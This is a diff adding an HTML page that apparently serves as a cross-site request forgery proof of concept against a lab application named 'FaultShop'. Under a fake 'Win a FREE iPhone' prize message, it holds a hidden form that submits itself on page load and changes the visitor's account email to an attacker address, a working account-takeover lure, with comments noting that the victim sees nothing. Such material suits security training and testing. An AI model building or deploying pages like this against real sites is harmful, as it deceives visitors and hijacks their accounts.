@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Win a FREE iPhone</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 3rem; background: #f0f0f0; }
+    h1 { color: #e63946; }
+    p { color: #555; }
+  </style>
+</head>
+<body>
+  <h1>Congratulations! You won a prize</h1>
+  <p>Processing your request...</p>
+
+  <!-- CSRF: form is submitted automatically on page load -->
+  <!-- The victim sees nothing suspicious, but their email changes in FaultShop -->
+  <form id="csrf_form" action="http://172.17.0.1:5000/my-account" method="POST" style="display:none">
+    <input type="hidden" name="email" value="attacker@malicious.com">
+  </form>
+
+  <script>
+    // Submitted automatically without the user noticing
+    document.getElementById('csrf_form').submit();
+  </script>
+</body>
+</html>
